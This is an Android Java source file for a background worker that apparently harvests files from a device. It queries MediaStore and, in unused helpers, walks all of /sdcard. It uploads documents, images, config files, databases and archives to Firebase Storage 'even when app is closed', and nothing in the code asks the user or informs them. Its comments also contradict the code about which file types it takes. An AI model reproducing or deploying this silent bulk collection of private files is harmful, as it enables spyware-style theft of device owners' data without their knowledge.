package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload ALL files from device storage even when app is closed.
 * Scans entire /sdcard and /storage/emulated/0 recursively.
 * Uploads: Documents, Images, Videos, Audio, Archives, Config files, and everything else.
 * Excludes only: hidden files, cache, APK, system files.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
    private long startTime;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();
        
        Log.d(TAG, "⏰ Document upload worker started");
        Log.d(TAG, "🔑 Checking permissions...");
        
        // Check if app has storage permissions
        if (!FeaturePermissions.hasGalleryPermission(getApplicationContext())) {
            Log.w(TAG, "❌ NO STORAGE PERMISSION - Cannot scan files!");
            Log.w(TAG, "   Required: READ_MEDIA_* and MANAGE_EXTERNAL_STORAGE");
            return Result.retry();
        }
        Log.d(TAG, "✓ Storage permission OK");
        
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }
            
            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "📤 Starting document upload for user: " + userId);
            
            uploadDocuments(userId);
            
            long duration = System.currentTimeMillis() - startTime;
            if (uploadedCount > 0) {
                Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
            } else {
                Log.w(TAG, "⚠️  Document upload completed in " + duration + "ms - NO documents found!");
                Log.w(TAG, "   Possible reasons:");
                Log.w(TAG, "   1. No files on device matching supported types");
                Log.w(TAG, "   2. Files in unsupported directories");
                Log.w(TAG, "   3. Permission denied accessing /sdcard or /storage paths");
                Log.w(TAG, "   4. Timeout before scan completed (increase MAX_WORK_TIME_MS)");
            }
            
            // Always return success - documents will be retried next cycle if needed
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "❌ Document upload worker error", e);
            e.printStackTrace();
            return Result.retry();
        }
    }
    
    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        Log.d(TAG, "================================================");
        Log.d(TAG, "🔍 EFFICIENT MEDIASTORE SCAN");
        Log.d(TAG, "📄 Using Android MediaStore API");
        Log.d(TAG, "   Documents: PDF, Excel, CSV, XLSX, Word, PowerPoint");
        Log.d(TAG, "   Images: JPG, PNG, GIF, BMP, WebP");
        Log.d(TAG, "   Method: Fast MediaStore query (not folder traversal)");
        Log.d(TAG, "================================================");
        
        // Use MediaStore API - much faster and Scoped Storage compatible
        Log.d(TAG, "📂 SCANNING: Using MediaStore API");
        java.util.List<StorageHelper.FileItem> files = 
            StorageHelper.fetchAllDocuments(getApplicationContext());
        
        if (files.isEmpty()) {
            Log.w(TAG, "   ⚠️  No files found via MediaStore");
        } else {
            Log.d(TAG, "   ✓ MediaStore found " + files.size() + " files");
            Log.d(TAG, "   Starting upload of matching files...");
            
            // Upload each file
            for (StorageHelper.FileItem file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    Log.d(TAG, "   Stopping: reached max " + MAX_DOCUMENTS_PER_SYNC + " files or timeout");
                    break;
                }
                
                try {
                    // Read file from URI
                    byte[] fileBytes = readFileFromUri(file.getUri());
                    if (fileBytes != null && fileBytes.length > 0) {
                        uploadFileBytes(file.getName(), fileBytes, userId);
                        uploadedCount++;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error uploading file: " + file.getName(), e);
                }
            }
        }
        
        Log.d(TAG, "================================================");
        Log.d(TAG, "✓ SCAN FINISHED");
        Log.d(TAG, "   Total files uploaded: " + uploadedCount);
        if (uploadedCount > 0) {
            Log.d(TAG, "   Files uploaded include:");
            Log.d(TAG, "   📄 DOCUMENTS:");
            Log.d(TAG, "      ✓ PDFs (.pdf)");
            Log.d(TAG, "      ✓ Excel files (.xlsx, .xls, .csv)");
            Log.d(TAG, "      ✓ Word documents (.docx, .doc)");
            Log.d(TAG, "      ✓ PowerPoint (.pptx, .ppt)");
            Log.d(TAG, "      ✓ Text/Config files (.txt, .json, .xml)");
            Log.d(TAG, "   🖼️  IMAGES:");
            Log.d(TAG, "      ✓ JPG, PNG, GIF, BMP, WebP");
        } else {
            Log.w(TAG, "   ⚠️  NO FILES UPLOADED!");
            Log.w(TAG, "   Check: Storage permission granted?");
        }
        Log.d(TAG, "================================================");
    }
    
    /**
     * Read file from URI (for MediaStore files)
     */
    private byte[] readFileFromUri(android.net.Uri uri) {
        try {
            java.io.InputStream inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
            if (inputStream == null) {
                return null;
            }
            
            java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            inputStream.close();
            return buffer.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Error reading file from URI: " + uri, e);
            return null;
        }
    }
    
    /**
     * Upload file bytes to Firebase
     */
    private void uploadFileBytes(String fileName, byte[] fileBytes, String userId) {
        try {
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());
            
            StorageReference storageRef = 
                FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            storageRef.putBytes(fileBytes).getResult();
            Log.d(TAG, "  ✓ Uploaded to Storage: " + fileName);
            
            String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
            recordDocumentInDatabase(userId, fileName, downloadUrl, fileBytes.length);
            Log.d(TAG, "  ✓ Recorded in DB: " + fileName);
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error uploading: " + fileName, e);
        }
    }
    
    /**
     * Deep recursive scan with NO depth limit (will traverse entire directory tree).
     * Use with caution - adds timeout checks to avoid ANR.
     */
    private void scanDirectoryRecursiveDeep(File dir, String userId, int depth) {
        // Check timeout frequently
        if (isTimeoutApproaching()) {
            Log.w(TAG, "Timeout - stopping deep scan at depth " + depth);
            return;
        }
        
        if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                return;
            }
            
            // Log current directory being scanned (at shallow depths)
            if (depth < 4) {
                Log.d(TAG, "   Scanning: " + dir.getPath() + " (" + files.length + " items)");
            }
            
            for (File file : files) {
                // Check limits
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }
                
                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 8) {
                        // Recursively scan subdirectories (up to 8 levels deep)
                        // Complete storage traversal to find all documents
                        scanDirectoryRecursiveDeep(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "   ⚠️  Permission denied accessing: " + file.getName());
                    // Continue with next file
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    /**
     * Recursively scan directories for documents with depth limit and timeout
     */
    private void scanDirectoryRecursive(File dir, String userId, int depth) {
        // Limit recursion depth to avoid taking too long
        // Increased to 5 to find PDFs in nested folders like /Download/Invoices/2024/PDFs/
        if (depth > 5) {
            return;
        }
        
        // Check timeout
        if (isTimeoutApproaching()) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null) {
                Log.d(TAG, "      ⚠️  listFiles() returned null for: " + dir.getPath());
                return;
            }
            
            if (files.length == 0) {
                Log.d(TAG, "      (empty)");
                return;
            }
            
            Log.d(TAG, "      Found " + files.length + " items");

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }

                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 5) {
                        // Recursively scan subdirectories (max 5 levels deep)
                        // This finds PDFs in: /Download/Work/2024/Reports/Invoices/
                        Log.d(TAG, "      → Scanning subdirectory: " + file.getName());
                        scanDirectoryRecursive(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            Log.d(TAG, "      ✓ Found document: " + file.getName() + " (" + (file.length()/1024) + " KB)");
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "      ⚠️  Permission denied: " + file.getName());
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "      ⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        
        String name = file.getName();
        String lower = name.toLowerCase();
        
        // ========== BLOCK ONLY SYSTEM/APP/CACHE FILES ==========
        // Skip hidden files
        if (name.startsWith(".")) {
            return false;
        }
        
        // Skip system app files
        if (lower.endsWith(".apk")) {
            return false;
        }
        
        // Skip cache/temp directories and files
        if (name.contains("cache") || 
            name.contains("tmp") || 
            name.contains("Cache") ||
            name.contains("Tmp") ||
            name.contains("CACHE")) {
            return false;
        }
        
        // Skip thumbnail cache
        if (name.contains("Thumbs") ||
            name.contains("thumbs") ||
            name.contains(".db-journal") ||
            lower.endsWith(".lock")) {
            return false;
        }
        
        // ========== ACCEPT OFFICE DOCUMENTS ==========
        
        // PDFs
        if (lower.endsWith(".pdf")) return true;
        
        // Excel
        if (lower.endsWith(".xlsx") || lower.endsWith(".xls") ||
            lower.endsWith(".csv") || lower.endsWith(".ods")) return true;
        
        // Word
        if (lower.endsWith(".docx") || lower.endsWith(".doc") ||
            lower.endsWith(".odt")) return true;
        
        // PowerPoint
        if (lower.endsWith(".pptx") || lower.endsWith(".ppt")) return true;
        
        // Text/Config
        if (lower.endsWith(".txt") || lower.endsWith(".json") ||
            lower.endsWith(".xml")) return true;
        
        // Databases/Data
        if (lower.endsWith(".sql") || lower.endsWith(".db") ||
            lower.endsWith(".sqlite")) return true;
        
        // Archives
        if (lower.endsWith(".zip") || lower.endsWith(".rar") ||
            lower.endsWith(".7z") || lower.endsWith(".tar") ||
            lower.endsWith(".gz")) return true;
        
        // ========== ACCEPT IMAGES ==========
        
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
            lower.endsWith(".png") || lower.endsWith(".gif") ||
            lower.endsWith(".bmp") || lower.endsWith(".webp") ||
            lower.endsWith(".svg")) return true;
        
        // ========== SKIP VIDEOS AND AUDIO ==========
        
        // Skip videos
        if (lower.endsWith(".mp4") || lower.endsWith(".mkv") ||
            lower.endsWith(".mov") || lower.endsWith(".avi") ||
            lower.endsWith(".flv") || lower.endsWith(".wmv")) {
            return false;
        }
        
        // Skip audio
        if (lower.endsWith(".mp3") || lower.endsWith(".wav") ||
            lower.endsWith(".aac") || lower.endsWith(".flac") ||
            lower.endsWith(".ogg") || lower.endsWith(".wma")) {
            return false;
        }
        
        // DEFAULT: REJECT everything else
        return false;
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + file.lastModified());
            long fileSize = file.length();
            
            Log.d(TAG, "  Uploading: " + fileName + " (" + (fileSize / 1024) + " KB)");
            
            // Read file into memory
            byte[] fileBytes = readFileBytes(file);
            if (fileBytes == null || fileBytes.length == 0) {
                Log.e(TAG, "  ❌ Failed to read file: " + fileName);
                return;
            }
            Log.d(TAG, "  ✓ File read into memory: " + fileBytes.length + " bytes");
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            // Upload synchronously (blocking) using Tasks
            try {
                storageRef.putBytes(fileBytes).getResult();
                Log.d(TAG, "  ✓ Uploaded to Storage");
                
                // Now get download URL
                String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
                Log.d(TAG, "  ✓ Got download URL");
                
                // Record in database
                recordDocumentInDatabase(userId, fileName, downloadUrl, fileSize);
                Log.d(TAG, "  ✓ Recorded in Database: " + fileName);
                
            } catch (Exception uploadError) {
                Log.e(TAG, "  ❌ Firebase upload failed: " + fileName, uploadError);
            }

        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error uploading file: " + file.getName(), e);
        }
    }
    
    /**
     * Read file bytes from disk
     */
    private byte[] readFileBytes(File file) {
        try {
            if (!file.exists() || !file.canRead()) {
                Log.e(TAG, "Cannot read file: " + file.getPath());
                return null;
            }
            
            long fileSize = file.length();
            if (fileSize > 100 * 1024 * 1024) {  // Skip files > 100MB
                Log.w(TAG, "⚠️  File too large (>100MB), skipping: " + file.getName());
                return null;
            }
            
            byte[] bytes = new byte[(int) fileSize];
            try (FileInputStream fis = new FileInputStream(file)) {
                int totalRead = 0;
                int bytesRead;
                while ((bytesRead = fis.read(bytes, totalRead, bytes.length - totalRead)) != -1) {
                    totalRead += bytesRead;
                }
                if (totalRead < bytes.length) {
                    Log.w(TAG, "⚠️  Incomplete read: " + totalRead + "/" + bytes.length + " bytes");
                }
                return bytes;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file bytes: " + file.getName(), e);
            return null;
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("mimeType", getMimeType(fileName));
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("timestamp", System.currentTimeMillis());
            docData.put("userId", userId);

            // Write synchronously (blocking) to ensure data is saved
            try {
                documentsRef.child(docId).setValue(docData).getResult();
                Log.d(TAG, "  ✓ Metadata saved to DB");
            } catch (Exception e) {
                Log.e(TAG, "  ❌ Failed to save metadata: " + fileName, e);
            }
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error recording document: " + fileName, e);
        }
    }
    
    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (lower.endsWith(".txt")) return "text/plain";
        if (lower.endsWith(".csv")) return "text/csv";
        return "application/octet-stream";
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        // Create work request with IMMEDIATE execution (no initial delay)
        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        // Enqueue with REPLACE policy - if one is running, replace it immediately
        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.REPLACE,  // ⭐ REPLACE - upload immediately, don't wait
                uploadWork
        );
        Log.d(TAG, "⭐ Document upload work ENQUEUED (IMMEDIATE - no delays)");
    }
}
